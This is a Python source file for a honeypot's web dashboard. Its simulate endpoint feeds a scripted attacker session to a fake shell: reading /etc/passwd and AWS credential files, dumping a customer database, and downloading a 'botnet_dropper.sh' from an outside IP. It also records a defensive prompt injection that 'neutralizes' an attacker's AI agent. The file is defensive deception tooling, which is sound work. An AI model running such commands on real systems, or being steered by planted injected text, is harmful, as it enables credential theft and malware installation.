"""Interactive Web Dashboard server for Cloud Honeypot AI & Defense Shield."""

from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import logging
from pathlib import Path
import socketserver
import threading
from typing import Any, Optional

from cloud_honeypot_ai.ai.cloud_defense import CLOUD_DEFENSE
from cloud_honeypot_ai.ai.threat_analyzer import THREAT_ANALYZER
from cloud_honeypot_ai.config import CONFIG
from cloud_honeypot_ai.core.session import GLOBAL_SESSION_MANAGER, SessionManager
from cloud_honeypot_ai.crypto.posture_auditor import CRYPTO_AUDITOR
from cloud_honeypot_ai.crypto.vault import CRYPTO_VAULT
from cloud_honeypot_ai.deception.canary_api_tracker import CANARY_GPS_TRACKER
from cloud_honeypot_ai.deception.defensive_prompt_poison import DEFENSIVE_POISONER
from cloud_honeypot_ai.deception.honey_database import HONEY_DB_GENERATOR
from cloud_honeypot_ai.deception.telemetry_beacon import TELEMETRY_BEACON_MGR

logger = logging.getLogger("honeypot.web")


class DashboardHandler(BaseHTTPRequestHandler):
    """HTTP handler serving the dashboard UI and REST APIs."""

    def log_message(self, format: str, *args) -> None:
        pass

    @property
    def session_mgr(self) -> SessionManager:
        return getattr(self.server, "session_mgr", GLOBAL_SESSION_MANAGER)

    def do_GET(self) -> None:
        path = self.path.split("?")[0]

        if path in ("/", "/index.html"):
            self._serve_file("index.html", "text/html")
        elif path == "/style.css":
            self._serve_file("style.css", "text/css")
        elif path == "/api/status":
            self._serve_json(
                {
                    "system": "Cloud Honeypot AI Shield",
                    "status": "active",
                    "version": "1.0.0",
                    "total_sessions": len(self.session_mgr.all_sessions()),
                }
            )
        elif path == "/api/sessions":
            sessions = [s.to_dict() for s in self.session_mgr.all_sessions()]
            self._serve_json(sessions)
        elif path == "/api/threats":
            reports = []
            for s in self.session_mgr.all_sessions()[-10:]:
                rep = THREAT_ANALYZER.analyze_session(s)
                reports.append(rep.to_dict())
            self._serve_json(reports)
        elif path == "/api/efficiency":
            # Add attacker IPs to defense optimizer
            for s in self.session_mgr.all_sessions():
                CLOUD_DEFENSE.add_malicious_ip(s.remote_ip)
            ruleset = CLOUD_DEFENSE.generate_defense_rules()
            self._serve_json(
                {
                    "metrics": ruleset.efficiency_metrics.to_dict(),
                    "aws_nacl_cli": ruleset.aws_nacl_cli,
                    "aws_sg_cli": ruleset.aws_sg_cli,
                    "linux_iptables": ruleset.linux_iptables,
                    "cloudflare_waf_api": ruleset.cloudflare_waf_api,
                    "terraform": ruleset.terraform_snippet,
                }
            )
        elif path == "/api/crypto":
            valid, msgs = CRYPTO_VAULT.verify_vault_integrity()
            # Demo posture audit
            audit = CRYPTO_AUDITOR.evaluate_environment(
                ssh_ciphers=["chacha20-poly1305@openssh.com", "aes256-gcm@openssh.com", "3des-cbc"],
                ssh_kex=["curve25519-sha256", "diffie-hellman-group1-sha1", "x25519mlkem768"],
                tls_protocols=["TLSv1.2", "TLSv1.3", "TLSv1.0"],
                tls_ciphers=["ECDHE-RSA-AES128-GCM-SHA256", "AES128-SHA"],
                kms_keys=[{"KeyId": "key-1234", "KeySpec": "SYMMETRIC_DEFAULT", "KeyRotationEnabled": True}],
            )
            self._serve_json(
                {
                    "vault_integrity_valid": valid,
                    "vault_messages": msgs,
                    "crypto_audit": audit.to_dict(),
                }
            )
        elif path == "/api/deception":
            self._serve_json(
                {
                    "canary_emails_count": len(HONEY_DB_GENERATOR.active_canary_emails),
                    "gps_keys_count": len(HONEY_DB_GENERATOR.active_gps_keys),
                    "gps_triggers": [t.to_dict() for t in CANARY_GPS_TRACKER.all_triggers()],
                    "beacon_alerts": [b.to_dict() for b in TELEMETRY_BEACON_MGR.all_alerts()],
                    "ai_poison_events": DEFENSIVE_POISONER.all_ai_triggers(),
                }
            )
        else:
            self.send_error(404, "Not Found")

    def do_POST(self) -> None:
        path = self.path.split("?")[0]
        if path == "/api/simulate":
            # Simulate a realistic hacker attack sequence with Active Deception & Watermarking
            from cloud_honeypot_ai.core.fake_shell import FakeShell
            import random

            demo_ips = ["185.220.101.5", "45.154.255.88", "103.203.57.12", "194.26.29.44"]
            chosen_ip = random.choice(demo_ips)
            session = self.session_mgr.create_session(chosen_ip, random.randint(40000, 65000), "SSH")

            # Record failed attempts then successful weak password
            session.record_auth_attempt("root", "123456", False)
            session.record_auth_attempt("admin", "admin123", True)

            shell = FakeShell(username="admin")
            cmds = [
                "uname -a",
                "whoami",
                "id",
                "cat /etc/passwd",
                "cat ~/.aws/credentials",
                "cat /docs/README_arquitetura.md",  # PROMPT INJECTION DEFENSIVE TRAP
                "pg_dump -h prod-db customers > /var/backups/customers_dump.sql", # 5 LIVING CELLS DUMP
                "cat /var/backups/customers_dump.sql",
                "python3 /opt/cloud_engine/test_engine.py", # TELEMETRY BEACON TRIGGER
                "wget http://194.26.29.10/botnet_dropper.sh",
                "chmod +x botnet_dropper.sh",
            ]
            for cmd in cmds:
                res = shell.execute(cmd)
                session.record_command(cmd, res.stdout, res.canary_triggered)

            # Simulate attacker running validation script on their home IP (VPN bypassed)
            home_ip_attacker = "177.54.144.92"  # Public broadband IP in São Paulo, Brazil
            canary_key = f"sk_live_picoas_gps_{session.session_id[:8]}_vip"
            gps_alert = CANARY_GPS_TRACKER.record_trigger(
                api_key=canary_key,
                client_ip=home_ip_attacker,
                user_agent="python-requests/2.31.0",
                headers={"Host": "api.picoas-cloud.internal", "Authorization": f"Bearer {canary_key}"},
            )
            session.record_command(
                f"GPS_KEY_TRIGGERED: {canary_key}",
                f"De-anonymized real attacker machine! IP: {home_ip_attacker} ({gps_alert.city}, {gps_alert.country})",
                canary_tag="GPS_CANARY_API_KEY_DEANONYMIZED",
            )

            # Simulate telemetry beacon callback from attacker local machine
            beacon_alert = TELEMETRY_BEACON_MGR.record_beacon_heartbeat(
                client_ip=home_ip_attacker,
                telemetry_dict={
                    "beacon_id": f"beacon_pkg_{session.session_id[:8]}",
                    "source_session": session.session_id,
                    "hostname": "kali-infiltrator-desktop",
                    "os": "Linux 6.1.0-kali9-amd64",
                    "local_user": "shadow_operator",
                    "machine": "x86_64",
                    "python_version": "3.11.2",
                },
            )
            session.record_command(
                f"TELEMETRY_BEACON_HEARTBEAT: {beacon_alert.beacon_id}",
                f"Attacker machine unmasked: Host '{beacon_alert.target_hostname}', User '{beacon_alert.target_local_username}', OS '{beacon_alert.target_os}'",
                canary_tag="TELEMETRY_BEACON_DEANONYMIZED_ATTACKER",
            )

            # Simulate attacker's AI Agent falling into defensive prompt poison
            DEFENSIVE_POISONER.record_ai_trigger(
                query_params={"session": session.session_id, "agent_compromised": "true"},
                client_ip=chosen_ip,
                user_agent="AutoGPT-Agent/4.0-Scraper",
            )
            session.record_command(
                "ATTACKER_AI_POISON_TRIGGER: /api/v1/ai-poison/trigger",
                "Attacker AutoGPT Agent Neutralized by Defensive Prompt Injection!",
                canary_tag="DEFENSIVE_PROMPT_INJECTION_TRIGGERED",
            )

            session.close()
            self.session_mgr.save_session_to_disk(session)

            # Analyze and seal in crypto vault
            report = THREAT_ANALYZER.analyze_session(session)
            CRYPTO_VAULT.seal_session(session.to_dict())
            CLOUD_DEFENSE.add_malicious_ip(chosen_ip)
            CLOUD_DEFENSE.add_malicious_ip(home_ip_attacker)
            CLOUD_DEFENSE.generate_defense_rules()

            self._serve_json({
                "status": "success",
                "session": session.to_dict(),
                "threat_report": report.to_dict(),
                "gps_deanonymization": gps_alert.to_dict(),
                "telemetry_beacon": beacon_alert.to_dict(),
            })
        else:
            self.send_error(404, "Not Found")

    def _serve_file(self, filename: str, content_type: str) -> None:
        static_dir = Path(__file__).resolve().parent / "static"
        file_path = static_dir / filename
        if not file_path.exists():
            self.send_error(404, "File not found")
            return
        content = file_path.read_bytes()
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(content)))
        self.end_headers()
        self.wfile.write(content)

    def _serve_json(self, data: Any) -> None:
        body = json.dumps(data, indent=2).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


class DashboardServer:
    """Dashboard server wrapper."""

    def __init__(
        self,
        host: str = CONFIG.host,
        port: int = CONFIG.dashboard_port,
        session_mgr: Optional[SessionManager] = None,
    ):
        self.host = host
        self.port = port
        self.session_mgr = session_mgr or GLOBAL_SESSION_MANAGER
        self.running = False
        self._httpd: Optional[HTTPServer] = None
        self._thread: Optional[threading.Thread] = None

    def start(self) -> None:
        class ThreadingHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
            daemon_threads = True

        self._httpd = ThreadingHTTPServer((self.host, self.port), DashboardHandler)
        self._httpd.session_mgr = self.session_mgr
        self.running = True

        self._thread = threading.Thread(target=self._httpd.serve_forever, daemon=True)
        self._thread.start()
        logger.info("Dashboard UI running on http://%s:%d", self.host, self.port)

    def stop(self) -> None:
        self.running = False
        if self._httpd:
            self._httpd.shutdown()
            self._httpd.server_close()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=1.0)
        logger.info("Dashboard UI stopped.")
